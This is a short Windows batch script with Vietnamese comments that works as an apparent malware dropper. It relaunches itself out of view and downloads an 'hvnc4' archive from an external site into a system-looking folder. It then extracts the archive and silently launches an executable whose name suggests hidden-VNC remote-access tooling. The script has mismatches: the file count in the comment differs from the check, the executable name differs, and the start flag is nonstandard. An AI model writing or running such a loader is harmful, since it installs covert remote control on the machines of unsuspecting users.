@echo off
:: Kiểm tra nếu đã chạy ở chế độ thu nhỏ
if "%1"=="fa" goto :RUN

:: Chạy lại tệp .bat ở chế độ thu nhỏ
start /fa cmd.exe /C "%~f0" fa
exit /b

:RUN
:: Tạo thư mục C:\winsystem\hvnc4\ nếu chưa tồn tại
mkdir "C:\winsystem\hvnc4\" >nul 2>&1

:: Bước 1: Tải hvnc4.zip từ URL về C:\winsystem\hvnc4\
curl -o "C:\winsystem\hvnc4\hvnc4.zip" "https://getbae-ai.com/files/hvnc4.zip" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    exit /b %ERRORLEVEL%
)

:: Bước 2: Giải nén hvnc4.zip vào C:\winsystem\hvnc4\
powershell -Command "Expand-Archive -Path 'C:\winsystem\hvnc4\hvnc4.zip' -DestinationPath 'C:\winsystem\hvnc4\' -Force" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    exit /b %ERRORLEVEL%
)

:: Bước 3: Kiểm tra số lượng tệp trong C:\winsystem\hvnc4\ (phải có ít nhất 28 tệp: 1 exe + 27 DLL)
set "file_count=0"
for %%F in ("C:\winsystem\hvnc4\*.*") do set /a file_count+=1
if %file_count% LSS 5 (
    exit /b 1
)

:: Bước 4: Khởi chạy hvnc4.exe ở chế độ thu nhỏ
start /fa "" /D "C:\winsystem\hvnc4\" "C:\winsystem\hvnc4\hvnc.exe" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    exit /b %ERRORLEVEL%
)

:: Thoát
exit /b 0